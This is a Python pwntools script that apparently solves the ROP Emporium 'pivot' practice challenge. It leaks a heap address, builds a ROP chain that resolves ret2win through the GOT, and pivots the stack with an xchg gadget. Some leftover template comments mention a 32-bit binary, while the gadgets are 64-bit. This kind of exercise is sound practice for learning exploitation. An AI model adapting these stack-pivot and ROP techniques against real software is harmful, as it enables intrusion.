#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./pivot")
lib = ELF("./libpivot.so")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)
# context.log_level = "debug"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+182
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.eip, alphabet="QWERT")
# info(offset)

io = start()

io.recvuntil(b"pivot: ")
heapAddress = int(io.recvuntil(b"\n").decode(), 16)
info("Heap address: %#x", heapAddress)

ret2win = lib.symbols["ret2win"]
foothold_function = lib.symbols["foothold_function"]
puts = exe.symbols["puts"]
xchg_rsp_rax = 0x4009BD
pop_eax = rop.find_gadget(["pop rax", "ret"])[0]
call_eax = 0x4006B0
add_rax_rbp = 0x4009C4
pop_rbp = 0x4007C8
mov_rax_dword_rax = 0x4009C0  # den skriver addressa som eax peker til til registry eax


offset = 40

chain = flat(
    exe.symbols["foothold_function"],
    pop_eax,
    exe.symbols["got.foothold_function"],
    mov_rax_dword_rax,
    pop_rbp,
    ret2win - foothold_function,
    add_rax_rbp,
    call_eax,
)
io.recvuntil(b"> ")
io.sendline(chain)

stackSmash = flat(asm("nop") * offset, pop_eax, heapAddress, xchg_rsp_rax)

io.recvuntil(b"> ")
io.sendline(stackSmash)

io.recvuntil(b"you!\n")
io.recvline()
io.interactive()

# BUG: Går an å hoppe tilbake til main og leake foothold_function
# got addresse med puts, men det er litt janky ettersom noe av input blir
# tatt inn fakka pga read elns.

# leakedFoothold_function = io.unpack()
# info(f"foothold_function: {hex(leakedFoothold_function)}")
# ret2win = leakedFoothold_function - foothold_function + ret2win
# info(f"ret2win: {hex(ret2win)}")

# payload = flat(asm("nop") * offset, ret2win, 0x0)

# io.recvuntil(b"pivot: ")
# heapAddress = int(io.recvuntil(b"\n").decode(), 16)
# info("Heap address: %#x", heapAddress)

# io.recvuntil(b"> ")
# io.sendline(payload)
# # io.recvuntil(b"> ")
# # io.sendline(payload)
# # print(io.recvall())

# io.interactive()

# print(io.recvall())

# io.interactive()

# 0x00000000004009bb <+0>:	pop    rax
# 0x00000000004009bc <+1>:	ret
# 0x00000000004009bd <+2>:	xchg   rsp,rax
# 0x00000000004009bf <+4>:	ret
# 0x00000000004009c0 <+5>:	mov    rax,QWORD PTR [rax]
# 0x00000000004009c3 <+8>:	ret
# 0x00000000004009c4 <+9>:	add    rax,rbp
# 0x00000000004009c7 <+12>:	ret
# 0x00000000004009c8 <+13>:	nop    DWORD PTR [rax+rax*1+0x0]
